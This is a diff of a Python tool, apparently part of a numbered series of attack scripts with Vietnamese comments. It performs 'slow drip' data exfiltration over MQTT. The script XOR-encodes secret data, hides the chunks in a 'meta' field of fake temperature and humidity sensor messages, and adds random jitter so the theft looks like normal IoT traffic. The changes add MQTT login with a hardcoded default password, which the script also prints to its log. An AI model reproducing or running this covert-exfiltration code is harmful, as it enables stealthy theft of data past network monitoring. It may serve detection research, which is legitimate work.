@@ -7,6 +7,7 @@ phát hiện nhất vì trông giống traffic bình thường.
 
 Chạy:
     python3 attack5_slow_drip.py --host 10.0.0.10 --topic home/sensor/temp --rate 0.2
+    python3 attack5_slow_drip.py --host 10.0.0.10 --topic home/sensor/temp --rate 0.2 --user mqttadmin --password Xk9mP2vL
 """
 
 import paho.mqtt.client as mqtt
@@ -63,7 +64,6 @@ def build_normal_looking_payload(chunk_encoded: str, seq: int, total: int,
     Tạo payload trông như sensor data bình thường,
     nhưng thực ra chứa mảnh data đánh cắp trong field 'meta'
     """
-    # Giá trị sensor giả — dao động thực tế
     base_temp = 22.5 + math.sin(seq * 0.3) * 2 + random.uniform(-0.5, 0.5)
     return {
         "device_id": f"sensor-{sensor_type}-001",
@@ -74,15 +74,15 @@ def build_normal_looking_payload(chunk_encoded: str, seq: int, total: int,
             "battery":     round(85 - seq * 0.1, 1),
         },
         "status": "normal",
-        # Field ẩn chứa mảnh data bí mật — trông như metadata bình thường
         "meta": f"fw=1.2.{seq}&chk={chunk_encoded}&s={seq}&t={total}",
     }
 
 
 def run_slow_drip(host: str, port: int, topic: str,
-                  rate: float, chunk_size: int):
+                  rate: float, chunk_size: int,
+                  username: str = None, password: str = None):
     """
-    Gửi data nhỏ giọt với tốc độ và pattern giống traffic bình thường
+    Gửi data nhỏ giọt với tốc độ và pattern giống traffic bình thường.
     rate: số message/giây (vd: 0.2 = 1 msg mỗi 5 giây)
     """
     encoded_secret = xor_encode(SECRET_DATA)
@@ -96,26 +96,49 @@ def run_slow_drip(host: str, port: int, topic: str,
     log.info(f"  Exfil rate          : {rate} msg/s  (~{1/rate:.0f}s/msg)")
     log.info(f"  Estimated duration  : {total_chunks/rate:.0f}s\n")
 
-    client = mqtt.Client(client_id=f"iot-sensor-{random.randint(100,999)}")
+    # ── Dùng CallbackAPIVersion mới để tránh DeprecationWarning ──────────────
+    try:
+        client = mqtt.Client(
+            mqtt.CallbackAPIVersion.VERSION2,
+            client_id=f"iot-sensor-{random.randint(100, 999)}",
+        )
+    except AttributeError:
+        # paho-mqtt < 2.0 không có CallbackAPIVersion
+        client = mqtt.Client(client_id=f"iot-sensor-{random.randint(100, 999)}")
+
+    # ── Set credentials nếu broker yêu cầu authentication ────────────────────
+    if username:
+        client.username_pw_set(username, password)
 
     connected = [False]
-    def on_connect(c, u, f, rc):
+
+    def on_connect(c, u, f, rc, *args):
         connected[0] = (rc == 0)
         if rc == 0:
             log.info("  Kết nối broker thành công")
         else:
-            log.error(f"  Kết nối thất bại (rc={rc})")
+            log.error(f"  Kết nối thất bại (rc={rc}) — "
+                      f"{'Sai credentials' if rc == 5 else 'Lỗi khác'}")
 
     client.on_connect = on_connect
-    client.connect(host, port, keepalive=60)
+
+    try:
+        client.connect(host, port, keepalive=60)
+    except ConnectionRefusedError:
+        log.error(f"Không kết nối được {host}:{port} — broker có đang chạy không?")
+        return
+
     client.loop_start()
 
-    # Chờ kết nối
+    # Chờ kết nối tối đa 5 giây
     timeout = time.time() + 5
     while not connected[0] and time.time() < timeout:
         time.sleep(0.1)
+
     if not connected[0]:
         log.error("Không kết nối được broker!")
+        log.error("Gợi ý: thêm --user mqttadmin --password Xk9mP2vL nếu broker bật auth")
+        client.loop_stop()
         return
 
     sensor_types = ["temp", "humidity", "motion", "light"]
@@ -143,14 +166,14 @@ def run_slow_drip(host: str, port: int, topic: str,
             log.warning(f"  [{seq+1}] Gửi thất bại (rc={result.rc})")
 
         # Jitter ngẫu nhiên — bắt chước sensor thực
-        jitter       = random.uniform(-0.3, 0.3) * (1 / rate)
-        sleep_time   = max(0.1, (1 / rate) + jitter)
+        jitter     = random.uniform(-0.3, 0.3) * (1 / rate)
+        sleep_time = max(0.1, (1 / rate) + jitter)
         time.sleep(sleep_time)
 
     client.loop_stop()
     client.disconnect()
 
-    elapsed = time.time() - start_time
+    elapsed  = time.time() - start_time
     avg_rate = sent_chunks / elapsed if elapsed > 0 else 0
 
     log.info("\n" + "=" * 60)
@@ -171,15 +194,15 @@ def run_slow_drip(host: str, port: int, topic: str,
 
     # ── Lưu log ────────────────────────────────────────────────────────────────
     output = {
-        "attack":          "slow_drip_exfil",
-        "target":          f"{host}:{port}",
-        "topic":           topic,
-        "total_chunks":    total_chunks,
-        "sent":            sent_chunks,
-        "duration_s":      elapsed,
-        "avg_rate_msg_s":  avg_rate,
-        "chunks_log":      exfil_log,
-        "timestamp":       datetime.now().isoformat(),
+        "attack":         "slow_drip_exfil",
+        "target":         f"{host}:{port}",
+        "topic":          topic,
+        "total_chunks":   total_chunks,
+        "sent":           sent_chunks,
+        "duration_s":     elapsed,
+        "avg_rate_msg_s": avg_rate,
+        "chunks_log":     exfil_log,
+        "timestamp":      datetime.now().isoformat(),
     }
     with open("attack5_slowdrip_log.json", "w") as f:
         json.dump(output, f, indent=2, ensure_ascii=False)
@@ -194,11 +217,13 @@ def run_slow_drip(host: str, port: int, topic: str,
 
 def main():
     parser = argparse.ArgumentParser(description="Slow Drip MQTT Exfiltration")
-    parser.add_argument("--host",       default="127.0.0.1",          help="IP broker MQTT")
-    parser.add_argument("--port",       type=int, default=1883,        help="Port broker")
-    parser.add_argument("--topic",      default="home/sensor/temp",    help="Topic nguỵ trang")
-    parser.add_argument("--rate",       type=float, default=0.2,       help="Msg/giây (vd: 0.2)")
-    parser.add_argument("--chunk-size", type=int,   default=32,        help="Bytes mỗi chunk")
+    parser.add_argument("--host",       default="127.0.0.1",       help="IP broker MQTT")
+    parser.add_argument("--port",       type=int, default=1883,     help="Port broker")
+    parser.add_argument("--topic",      default="home/sensor/temp", help="Topic nguỵ trang")
+    parser.add_argument("--rate",       type=float, default=0.2,    help="Msg/giây (vd: 0.2)")
+    parser.add_argument("--chunk-size", type=int,   default=32,     help="Bytes mỗi chunk")
+    parser.add_argument("--user",       default="mqttadmin",        help="MQTT username")
+    parser.add_argument("--password",   default="Xk9mP2vL",         help="MQTT password")
     args = parser.parse_args()
 
     log.info("=" * 60)
@@ -207,9 +232,18 @@ def main():
     log.info(f"  Topic   : {args.topic}")
     log.info(f"  Rate    : {args.rate} msg/s")
     log.info(f"  Chunk   : {args.chunk_size} bytes")
+    log.info(f"  Auth    : {args.user} / {args.password}")
     log.info("=" * 60)
 
-    run_slow_drip(args.host, args.port, args.topic, args.rate, args.chunk_size)
+    run_slow_drip(
+        host=args.host,
+        port=args.port,
+        topic=args.topic,
+        rate=args.rate,
+        chunk_size=args.chunk_size,
+        username=args.user,
+        password=args.password,
+    )
 
 
 if __name__ == "__main__":
